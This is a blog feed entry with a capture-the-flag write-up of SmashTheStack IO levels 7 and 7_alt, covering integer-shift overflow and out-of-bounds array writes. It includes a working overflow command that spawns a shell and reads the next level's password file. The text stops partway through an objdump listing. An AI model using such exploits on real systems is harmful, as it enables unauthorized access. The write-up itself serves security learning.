<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: SmashTheStack-IO | OJ's perspective]]></title>
  <link href="http://buffered.io/categories/smashthestack-io/atom.xml" rel="self"/>
  <link href="http://buffered.io/"/>
  <updated>2013-12-12T19:36:57+10:00</updated>
  <id>http://buffered.io/</id>
  <author>
    <name><![CDATA[OJ Reeves]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Levels 7 and 7_alt - IO at STS]]></title>
    <link href="http://buffered.io/posts/levels-7-and-7_alt-io-at-sts/"/>
    <updated>2013-08-15T13:51:00+10:00</updated>
    <id>http://buffered.io/posts/levels-7-and-7_alt-io-at-sts</id>
    <content type="html"><![CDATA[<p>I've been documenting my experiences with <a href="http://io.smashthestack.org:84/" title="IO @ Smash The Stack">IO</a> at <a href="http://smashthestack.org/" title="Smash The Stack">SmashTheStack</a> for a while, but decided not to post them publicly for a few reasons. However level 7 (in particular the <code>alt</code> level) was the first that I thought worthy of posting. This post includes how I broke both applications to make it through to the level 8. If you haven't had a play on the <a href="http://smashthestack.org/" title="Smash The Stack">SmashTheStack</a> wargames yet, I really do recommend it. They're great fun.</p>

<!--more-->


<h2>Spoiler Alert</h2>

<p>This post covers, in detail, how to get past level 7 and level 7 alt. If you haven't done these levels yourself yet, and you plan to, then please don't read this until you've nailed them yourself. I'd hate for this to ruin your experience.</p>

<p>However, if you've done the level or you're just interested in what's involved, please read on.</p>

<h2>Connecting</h2>

<p>Fire up a shell and connect to the game server with the password for the <code>level7</code> user (I won't be sharing passwords here).</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ssh level7@io.smashthestack.org
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Let's see what challenges there are for us:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level7@io:~<span class="nv">$ </span>ls /levels/level07*
</span><span class='line'>/levels/level07  /levels/level07_alt  /levels/level07_alt.c  /levels/level07.c
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>This level has two possible entry points, and we'll be covering both in this post.</p>

<h2>Level 07</h2>

<p>We start by looking at the source of the target program:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>level07.c  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">//written by bla&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>    <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">count</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">10</span> <span class="p">)</span>
</span><span class='line'>            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">count</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mh">0x574f4c46</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;WIN!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s">&quot;sh&quot;</span> <span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Not today son</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>What's clear here is that we need to pass a number in that is less than <code>10</code>, but is big enough to allow us to overflow <code>buf</code> so that we can modify the value of <code>count</code>. The data that's written to <code>buf</code> is only allowed to be <code>count * sizeof(int)</code> in size.  We can easily pass in numbers smaller than 10, but they won't be big enough to overflow <code>buf</code>. If we pass in a <em>negative</em> number we bypass the check, but the call to <code>memcpy</code> will fail because <code>count * sizeof(int)</code> is negative.</p>

<p>We need to find a way of turning this calculation into something positive, but also much bigger than <code>10 * sizeof(int)</code> so that we can overflow <code>buf</code>.</p>

<p>What's interesting about this is that <code>sizeof(int)</code> on a 32-bit machine is <code>4</code>, which is effectively a <code>SHL 2</code> operation. We can confirm this by disassembling <code>main</code> and looking at the generated output:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb<span class="nv">$ </span>disas main
</span><span class='line'>Dump of assembler code <span class="k">for function </span>main:
</span><span class='line'>0x08048414 &amp;lt;main+0&gt;:    push   ebp
</span><span class='line'>0x08048415 &amp;lt;main+1&gt;:    mov    ebp,esp
</span><span class='line'>0x08048417 &amp;lt;main+3&gt;:    sub    esp,0x68
</span><span class='line'>0x0804841a &amp;lt;main+6&gt;:    and    esp,0xfffffff0
</span><span class='line'>0x0804841d &amp;lt;main+9&gt;:    mov    eax,0x0
</span><span class='line'>0x08048422 &amp;lt;main+14&gt;:   sub    esp,eax
</span><span class='line'>0x08048424 &amp;lt;main+16&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
</span><span class='line'>0x08048427 &amp;lt;main+19&gt;:   add    eax,0x4
</span><span class='line'>0x0804842a &amp;lt;main+22&gt;:   mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
</span><span class='line'>0x0804842c &amp;lt;main+24&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'>0x0804842f &amp;lt;main+27&gt;:   call   0x8048354 &amp;lt;atoi@plt&gt;
</span><span class='line'>0x08048434 &amp;lt;main+32&gt;:   mov    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,eax
</span><span class='line'>0x08048437 &amp;lt;main+35&gt;:   cmp    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,0x9
</span><span class='line'>0x0804843b &amp;lt;main+39&gt;:   jle    0x8048446 &amp;lt;main+50&gt;
</span><span class='line'>0x0804843d &amp;lt;main+41&gt;:   mov    DWORD PTR <span class="o">[</span>ebp-0x4c<span class="o">]</span>,0x1
</span><span class='line'>0x08048444 &amp;lt;main+48&gt;:   jmp    0x80484ad &amp;lt;main+153&gt;
</span><span class='line'>0x08048446 &amp;lt;main+50&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>
</span><span class='line'>0x08048449 &amp;lt;main+53&gt;:   shl    eax,0x2                          &lt;- here
</span><span class='line'>0x0804844c &lt;main+56&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,eax
</span><span class='line'>0x08048450 &amp;lt;main+60&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
</span><span class='line'>0x08048453 &amp;lt;main+63&gt;:   add    eax,0x8
</span><span class='line'>0x08048456 &amp;lt;main+66&gt;:   mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
</span><span class='line'>0x08048458 &amp;lt;main+68&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
</span><span class='line'>0x0804845c &amp;lt;main+72&gt;:   lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
</span><span class='line'>0x0804845f &amp;lt;main+75&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'>0x08048462 &amp;lt;main+78&gt;:   call   0x8048334 &amp;lt;memcpy@plt&gt;
</span><span class='line'>0x08048467 &amp;lt;main+83&gt;:   cmp    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,0x574f4c46
</span><span class='line'>0x0804846e &amp;lt;main+90&gt;:   jne    0x804849a &amp;lt;main+134&gt;
</span><span class='line'>0x08048470 &amp;lt;main+92&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048584
</span><span class='line'>0x08048477 &amp;lt;main+99&gt;:   call   0x8048344 &amp;lt;printf@plt&gt;
</span><span class='line'>0x0804847c &amp;lt;main+104&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x0
</span><span class='line'>0x08048484 &amp;lt;main+112&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x804858a
</span><span class='line'>0x0804848c &amp;lt;main+120&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x804858d
</span><span class='line'>0x08048493 &amp;lt;main+127&gt;:  call   0x8048324 &amp;lt;execl@plt&gt;
</span><span class='line'>0x08048498 &amp;lt;main+132&gt;:  jmp    0x80484a6 &amp;lt;main+146&gt;
</span><span class='line'>0x0804849a &amp;lt;main+134&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048595
</span><span class='line'>0x080484a1 &amp;lt;main+141&gt;:  call   0x8048344 &amp;lt;printf@plt&gt;
</span><span class='line'>0x080484a6 &amp;lt;main+146&gt;:  mov    DWORD PTR <span class="o">[</span>ebp-0x4c<span class="o">]</span>,0x0
</span><span class='line'>0x080484ad &amp;lt;main+153&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp-0x4c<span class="o">]</span>
</span><span class='line'>0x080484b0 &amp;lt;main+156&gt;:  leave&lt;br/&gt;
</span><span class='line'>0x080484b1 &amp;lt;main+157&gt;:  ret  &lt;br/&gt;
</span><span class='line'>End of assembler dump.
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Some investigation of the behaviour of this instruction lead me to realise that there was room for abuse when values over/underflow. If we use <code>SHL</code> with numbers of a small enough negative value, those values become positive. Let's have a look at that in action by whipping up a sample program and viewing the output:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Testing Shifts Source  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2147483647</span><span class="p">;</span>
</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Compile this code with <code>gcc</code> and run it, and you'll find the following:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Testing Shifts  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level7@io:/tmp/tc7<span class="nv">$ </span>./a.out
</span><span class='line'>0x80000001
</span><span class='line'>0x4
</span><span class='line'>0x44
</span><span class='line'>0x84
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>So we can pass in a negative integer, have it shift and turn it into a positive that's big enough to overflow the buffer. Once we've overflowed, all we need to do is write the value <code>0x574f4c46</code> to the desired memory location and the level will pass. We can get smart and figure out exactly where this needs to be, or we can go with the approach of repeatedly writing it knowing that somewhere along the line it'll end up being written to where we need it to be: in the <code>count</code> varaible. I chose to do the latter. We pass this data in as the second argument on the command line. Let's see how this looks:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Exploit Run  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level7@io:<span class="nv">$ </span>/levels/level07 -2147483600 &lt;code&gt;perl -e <span class="s1">&#39;print &quot;\x46\x4c\x4f\x57&quot; x 100&#39;</span>&lt;/code&gt;
</span><span class='line'>WIN!
</span><span class='line'>sh-4.1<span class="nv">$ </span>cat /home/level8/.pass
</span><span class='line'>&amp;lt;&amp;lt; -- password was printed here -- &gt;&gt;
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>This level was relatively simple, but was good exposure to the idea of how integer underflows can cause problems.</p>

<h2>Level 07 alt</h2>

<p>Let's start with the source of the alternate application, modified a little by me (and highlighted):</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>level07_alt.c  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/*&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">&lt;pre&gt;&lt;code&gt;Coding by LarsH</span>
</span><span class='line'>
</span><span class='line'><span class="cm">PJYN GIEZIRC FRD RBNE OM QNML PE ZMP PJM BMPPMI AIMHQMDFYMN AIEC R PMUP,</span>
</span><span class='line'><span class="cm">this program can also be used to get the letter frequencies from a text  &amp;lt;-- I added this</span>
</span><span class='line'><span class="cm">TJYFJ JMBGN TJMD FIRFWYDZ NPRDLRIL CEDENQONPYPQPYED FYGJMIN.</span>
</span><span class='line'><span class="cm">which helps when cracking standard monosubstitution ciphers              &amp;lt;-- I added this</span>
</span><span class='line'><span class="cm">&lt;/code&gt;&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">&lt;p&gt;*/</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">static</span> <span class="kt">int</span> <span class="n">count</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s words</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* Clear out the frequency buffer */</span>
</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>    <span class="n">count</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* Fill the frequency buffer */</span>
</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="n">argv</span><span class="p">[</span><span class="n">j</span><span class="p">];</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">argv</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">i</span><span class="p">];</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>        <span class="n">count</span><span class="p">[</span><span class="n">argv</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">i</span><span class="p">]]</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* Print out the frequency buffer */</span>
</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">count</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%c found %i time%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">count</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">count</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="o">?</span><span class="s">&quot;s&quot;</span><span class="o">:</span><span class="s">&quot;&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>On the surface it's hard to see where this application could be attacked! It's one of those bit of code that seems rather non-descript, yes has a very subtle issue in it which will allow us to gain some form of control. The obvious thing to look for is where memory is modified as a result of our user input, and this leads us to the following line:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">count</span><span class="p">[</span><span class="n">argv</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">i</span><span class="p">]]</span><span class="o">++</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Here the code is using the <code>j</code>th word (passed in on the command line via <code>argv</code>) and accessing its <code>i</code>th character, then using this character as an index into <code>count</code> to increment the count for that letter. The application is obviously doing a simple letter-tally. Straight up this looks like a potential point of attack because the values in <code>argv</code> are <em>signed</em> characters, and hence we can pass in values that are <strong>negative</strong> and write outside the bounds of the <code>count</code> array. Let's <code>objdump</code> the binary to see where <code>count</code> lives:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>objdump -D /levels/level07_alt | grep count
</span><span class='line'>08049720 &lt;count&gt;:
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>The negative values we can use are from <code>CHAR_MIN</code> (<code>-128</code>) &times; <code>sizeof(int)</code> (<code>4</code> on a 32-bit system) to <code>0</code>. So with <code>count</code> located at <code>0x8049720</code>, it means we can write values from here, all the way back to <code>0x8049520</code>. Let's see what fits within this range, again by looking at the output of <code>objdump</code>:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
